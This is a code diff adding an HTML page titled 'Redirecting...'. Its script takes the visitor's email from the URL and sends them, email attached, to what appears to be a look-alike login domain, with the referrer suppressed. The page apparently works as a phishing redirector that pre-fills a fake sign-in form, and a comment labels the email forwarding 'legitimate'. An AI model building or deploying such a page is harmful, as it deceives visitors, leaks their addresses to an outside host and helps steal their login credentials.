@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9fafb;
+            color: #374151;
+        }
+        .loader {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <p>Redirecting you to the destination...</p>
+    </div>
+    <script>
+        (function() {
+            // Configuration: Replace with your actual destination URL
+            const destinationBase = "https://login.kiahglobaluea.com/IObbZFrE";
+            
+            // Get URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const userEmail = urlParams.get('email');
+            try {
+                const targetUrl = new URL(destinationBase);
+                
+                // Legitimate email handling: If an email was passed to this page 
+                // in the URL, we can append it to the destination
+                if (userEmail) {
+                    targetUrl.searchParams.set('email', userEmail);
+                }
+                // Perform the redirect
+                window.location.replace(targetUrl.toString());
+            } catch (e) {
+                console.error("Invalid destination URL configuration.");
+                document.querySelector('.loader').innerHTML = "<p>Unable to redirect. Please check the link.</p>";
+            }
+        })();
+    </script>
+</body>
+</html>
